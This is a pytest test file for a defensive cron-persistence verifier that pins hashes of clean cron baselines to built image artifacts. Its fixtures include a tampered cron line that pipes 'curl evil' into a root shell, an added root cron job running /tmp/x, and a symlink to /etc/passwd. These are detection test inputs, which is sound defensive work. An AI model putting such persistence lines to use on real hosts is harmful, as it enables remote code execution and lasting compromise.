"""Plan 18 — trusted cron baselines bound to built artifacts (fast layer).

The cron verifier v3 refuses to call a clean-looking /etc/cron.d clean on
FILENAME alone (filenames are exactly what persistence malware reuses), so
before the pins existed the check could only ever answer UNKNOWN. These
tests prove the whole pin lifecycle WITHOUT booting anything:

* capture from a clean artifact tree, pin build, validation, document
  round-trip;
* pins are honoured ONLY while the artifact/template the deployment
  actually runs on matches the pin — anything else degrades to UNKNOWN
  (never a pass, never a guess);
* the runtime injection into the verifier arguments (matching template
  injects; wrong template, unknown role, absent/corrupt pin, or an
  explicit snapshot baseline all pass the scenario args through);
* end-to-end through the REAL verifier v3: pinned-clean passes the blue
  'expect: absent' check, a content-tampered baseline file fails it
  deterministically, no pin stays UNKNOWN;
* the CLI re-pins one role at a time (merge preserving other pins) and
  refuses when an artifact's cron state drifted from its pin.
"""
from __future__ import annotations

import hashlib
import json
import pathlib

import pytest

from infra.images import cron_baseline as cb
from verifiers.base import Context
from verifiers.library.flag_file import CronPersistencePresent

ROLE = "mojang-web-local"
TID = 9011
CLEAN_CRON = "30 3 * * root . /etc/default/rcS; e2scruball\n"


def _sha(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


def _tree(tmp_path: pathlib.Path) -> pathlib.Path:
    """A clean built-artifact rootfs tree as image-build leaves it."""
    root = tmp_path / "tree"
    cron_d = root / "etc" / "cron.d"
    cron_d.mkdir(parents=True)
    (cron_d / "e2scrub_all").write_text(CLEAN_CRON)
    spool = root / "var/spool/cron/crontabs"
    spool.mkdir(parents=True)
    (spool / "root").write_text("@reboot /usr/local/bin/sr-boot-note\n")
    return root


def _pin(role: str = ROLE, *, tid: int = TID,
         digest: str = "a" * 64) -> dict:
    return cb.build_pin(role, artifact_sha256=digest,
                        artifact_version="2026.10", template_id=tid,
                        capture={"files": {"e2scrub_all": _sha(
                            CLEAN_CRON.encode())},
                            "root_crontab_sha256": None})


# --------------------------------------------------------------------------- #
# capture / build / validate / round-trip                                       #
# --------------------------------------------------------------------------- #

def test_capture_binds_tree_content_and_skips_symlinks(tmp_path):
    tree = _tree(tmp_path)
    # a symlink, a directory and a nested path must never enter a pin
    (tree / "etc" / "cron.d" / "evil").symlink_to("/etc/passwd")
    (tree / "etc" / "cron.d" / "subdir").mkdir()
    cap = cb.capture_from_tree(tree)
    assert set(cap["files"]) == {"e2scrub_all"}
    assert cap["files"]["e2scrub_all"] == _sha(CLEAN_CRON.encode())
    assert cap["root_crontab_sha256"] == _sha(
        (tree / "var/spool/cron/crontabs/root").read_bytes())


def test_pin_document_round_trips_and_validates(tmp_path):
    pins = {ROLE: _pin()}
    doc = tmp_path / "cron-baselines.json"
    cb.dump_pins(doc, pins)
    assert cb.load_pins(doc) == pins


def test_tampered_or_unsafe_pins_make_the_whole_document_absent(tmp_path):
    doc = tmp_path / "pins.json"
    good = _pin()

    def load(payload):
        doc.write_text(json.dumps(payload))
        return cb.load_pins(doc)

    wrapped = lambda pin: {"schema": cb.SCHEMA, "pins": {ROLE: pin}}  # noqa: E731
    assert load(wrapped({**good, "files": {"x": "nope"}})) == {}
    assert load(wrapped({**good, "captured_from": "live"})) == {}
    assert load(wrapped({**good, "files": {
        "/etc/cron.d/x": good["files"]["e2scrub_all"]}})) == {}
    assert load(wrapped({**good, "template_id": "9011"})) == {}
    assert load({"schema": 99, "pins": {ROLE: good}}) == {}
    assert load({"schema": cb.SCHEMA, "pins": {ROLE: "nope"}}) == {}
    assert load(wrapped(good)) == {ROLE: good}


def test_pins_are_bound_to_digest_and_template():
    pins = {ROLE: _pin()}
    assert cb.trusted_hashes_for_template(pins, ROLE, TID) == \
        pins[ROLE]["files"]
    assert cb.trusted_hashes_for_template(pins, ROLE, 9012) == {}
    assert cb.trusted_hashes_for_template(pins, "mojang-web-db", TID) == {}
    assert cb.trusted_hashes_for_template(pins, None, TID) == {}
    assert cb.trusted_hashes_for_template({}, ROLE, TID) == {}
    # digest binding (release artifact re-verified before trust)
    assert cb.trusted_hashes(pins, ROLE, "A" * 64) == pins[ROLE]["files"]
    assert cb.trusted_hashes(pins, ROLE, "b" * 64) == {}


# --------------------------------------------------------------------------- #
# runtime injection                                                             #
# --------------------------------------------------------------------------- #

def test_injection_only_for_matching_template_and_cron_verifier():
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    templates = {"web01": TID, "db01": 9012}

    base = {"host": "web01", "baseline_files": ["e2scrub_all"]}
    out = vs.with_cron_baseline(dict(base),
                                verifier_id="cron_persistence_present",
                                host="web01", templates=templates, pins=pins)
    assert out["baseline_file_sha256"] == pins[ROLE]["files"]
    assert out["baseline_files"] == ["e2scrub_all"]     # snapshot untouched

    # wrong template / other verifier / no pins: args pass through unchanged
    db = dict(base, host="db01")
    assert vs.with_cron_baseline(dict(db),
                                 verifier_id="cron_persistence_present",
                                 host="db01", templates=templates,
                                 pins=pins) == db
    assert vs.with_cron_baseline(dict(base), verifier_id="service_running",
                                 host="web01", templates=templates,
                                 pins=pins) == base
    assert vs.with_cron_baseline(dict(base),
                                 verifier_id="cron_persistence_present",
                                 host="web01", templates=templates,
                                 pins={}) == base
    # an explicit snapshot baseline always wins over injection
    explicit = dict(base, baseline_file_sha256={"e2scrub_all": "f" * 64})
    assert vs.with_cron_baseline(dict(explicit),
                                 verifier_id="cron_persistence_present",
                                 host="web01", templates=templates,
                                 pins=pins) == explicit


def test_load_cron_pins_is_tolerant_of_absence_or_corruption(monkeypatch,
                                                             tmp_path):
    import srplatform.verification_service as vs

    def use(value):
        class _S:
            cron_baseline_file = value
        monkeypatch.setattr(vs, "get_settings", lambda: _S())

    use("")
    assert vs.load_cron_pins() == {}
    use(str(tmp_path / "absent.json"))
    assert vs.load_cron_pins() == {}          # absent file == no pins
    (tmp_path / "bad.json").write_text("{not json")
    use(str(tmp_path / "bad.json"))
    assert vs.load_cron_pins() == {}          # corrupt file == no pins
    doc = tmp_path / "good.json"
    cb.dump_pins(doc, {ROLE: _pin()})
    use(str(doc))
    assert vs.load_cron_pins() == {ROLE: _pin()}


# --------------------------------------------------------------------------- #
# end to end through the REAL verifier v3                                       #
# --------------------------------------------------------------------------- #

class _FakeExec:
    """Answers the v3 structured cron probe from a fake guest inventory."""

    def __init__(self, files: dict[str, tuple[str, int]]):
        # name -> (content, uid); regular, root-owned, 0644
        self.files = files

    def __call__(self, host: str, command: str) -> tuple[int, str]:
        assert "/etc/cron.d" in command and "crontab" in command
        out = {"files": {}, "crontab": ""}
        for name, (content, uid) in self.files.items():
            data = content.encode()
            out["files"][name] = {"uid": uid, "gid": 0, "mode": 0o644,
                                  "size": len(data), "type": "regular",
                                  "sha256": _sha(data),
                                  "symlink_target": None}
        return 0, json.dumps(out)


def _clean_files():
    return {"e2scrub_all": (CLEAN_CRON, 0)}


BLUE_ARGS = {"host": "web01", "baseline_files": ["e2scrub_all"],
             "expect": "absent"}


def _evaluate(exec_fn, args):
    return CronPersistencePresent().evaluate(
        Context(exec=exec_fn, hosts={"web01": "10.0.0.2"}), **args)


def test_pinned_clean_guest_now_passes_deterministically(tmp_path):
    """The blue 'cron absent' check was UNKNOWN forever; with a pin bound
    to the artifact this session cloned from, it now decides."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", templates={"web01": TID},
                                 pins=pins)
    out = _evaluate(_FakeExec(_clean_files()), args)
    assert out.status == "passed", out.evidence

    # and the same truth inverts for the red polarity (nothing found)
    red = dict(args, expect="true")
    assert _evaluate(_FakeExec(_clean_files()), red).status == "failed"


def test_pinned_check_fails_on_content_tampering(tmp_path):
    """A persistence plant that REUSES the trusted filename is caught: the
    digest no longer matches, so it is unexpected — deterministically."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    args = vs.with_cron_baseline(dict(BLUE_ARGS),
                                 verifier_id="cron_persistence_present",
                                 host="web01", templates={"web01": TID},
                                 pins=pins)
    tampered = {"e2scrub_all": ("* * * * * root curl evil|sh\n", 0)}
    out = _evaluate(_FakeExec(tampered), args)
    assert out.status == "failed"
    assert "e2scrub_all" in out.evidence["unexpected_files"]

    # an ADDED file is unexpected too (even next to a trusted one)
    extra = dict(_clean_files())
    extra["shadowguard"] = ("* * * * * root /tmp/x\n", 0)
    out = _evaluate(_FakeExec(extra), args)
    assert out.status == "failed"
    assert "shadowguard" in out.evidence["unexpected_files"]


def test_unpinned_check_stays_unknown_never_clean():
    """Without a pin the filename-only baseline still cannot establish
    clean state — the historical UNKNOWN behaviour is unchanged."""
    out = _evaluate(_FakeExec(_clean_files()), dict(BLUE_ARGS))
    assert out.status == "unknown"
    assert "trusted cron content baseline missing" in (out.error or "")
    # an explicit snapshot hash still works without any pin file
    explicit = dict(BLUE_ARGS,
                    baseline_file_sha256={"e2scrub_all": _sha(
                        CLEAN_CRON.encode())})
    assert _evaluate(_FakeExec(_clean_files()), explicit).status == "passed"


def test_stale_pin_yields_unknown_not_a_pass(tmp_path):
    """Artifact was rebuilt (new template map) — the pin is refused and
    the check degrades to UNKNOWN, never silently to a pass."""
    import srplatform.verification_service as vs
    pins = {ROLE: _pin()}
    stale = vs.with_cron_baseline(dict(BLUE_ARGS),
                                  verifier_id="cron_persistence_present",
                                  host="web01",
                                  templates={"web01": 9099},  # rebuilt host
                                  pins=pins)
    assert "baseline_file_sha256" not in stale
    assert _evaluate(_FakeExec(_clean_files()), stale).status == "unknown"


# --------------------------------------------------------------------------- #
# CLI: per-role capture, merge, drift refusal                                   #
# --------------------------------------------------------------------------- #

def _release(tmp_path: pathlib.Path):
    image = tmp_path / "mojang-web-local.qcow2"
    image.write_bytes(b"FAKEQCOW" * 8)
    return image, _tree(tmp_path)


def test_cli_capture_then_verify_roundtrip_and_role_merge(tmp_path):
    image, tree = _release(tmp_path)
    out = tmp_path / "cron-baselines.json"
    digest = _sha(image.read_bytes())

    assert cb.main(["capture", "--role", ROLE, "--tree", str(tree),
                    "--image", str(image), "--template-id", str(TID),
                    "--out", str(out)]) == 0
    pins = cb.load_pins(out)
    assert pins[ROLE]["artifact_sha256"] == digest
    assert pins[ROLE]["template_id"] == TID

    assert cb.main(["verify", "--pin", str(out), "--role", ROLE,
                    "--tree", str(tree)]) == 0

    # a second role's capture MERGES (unchanged roles keep their pins)
    image2 = tmp_path / "mojang-web-db.qcow2"
    image2.write_bytes(b"OTHER")
    tree2 = _tree(tmp_path / "db")
    assert cb.main(["capture", "--role", "mojang-web-db", "--tree", str(tree2),
                    "--image", str(image2), "--template-id", "9012",
                    "--out", str(out)]) == 0
    pins = cb.load_pins(out)
    assert set(pins) == {ROLE, "mojang-web-db"}
    assert pins[ROLE]["artifact_sha256"] == digest

    # a changed artifact must NOT silently re-pin: verify refuses, loudly
    (tree / "etc" / "cron.d" / "newfoot.sql").write_text("-- added\n")
    assert cb.main(["verify", "--pin", str(out), "--role", ROLE,
                    "--tree", str(tree)]) == 1


def test_capture_from_verify_markers_parses_the_clean_boot():
    cap = {"files": {"e2scrub_all": _sha(CLEAN_CRON.encode())},
           "root_crontab_sha256": None}
    marker = "SR-GUEST-CRON-PIN " + json.dumps(cap, sort_keys=True)
    parsed = cb.capture_from_verify_markers(
        ["SR-GUEST-BOOT-PASS", marker, "SR-GUEST-DONE"])
    assert parsed == cap

    with pytest.raises(ValueError, match="no SR-GUEST-CRON-PIN"):
        cb.capture_from_verify_markers(["SR-GUEST-DONE"])
    with pytest.raises(ValueError, match="invalid"):
        cb.capture_from_verify_markers(["SR-GUEST-CRON-PIN {broken"])
    # the double emission survives ONE corrupted line, never bad trust
    good = json.dumps({"files": {"e2scrub_all": _sha(CLEAN_CRON.encode())},
                       "root_crontab_sha256": None}, sort_keys=True)
    parsed = cb.capture_from_verify_markers(
        ["SR-GUEST-CRON-PIN {trunc", f"SR-GUEST-CRON-PIN {good}"])
    assert parsed["files"]["e2scrub_all"] == _sha(CLEAN_CRON.encode())
    with pytest.raises(ValueError, match="invalid entry"):
        cb.capture_from_verify_markers(
            ['SR-GUEST-CRON-PIN {"files": {"x": "nothash"}}'])
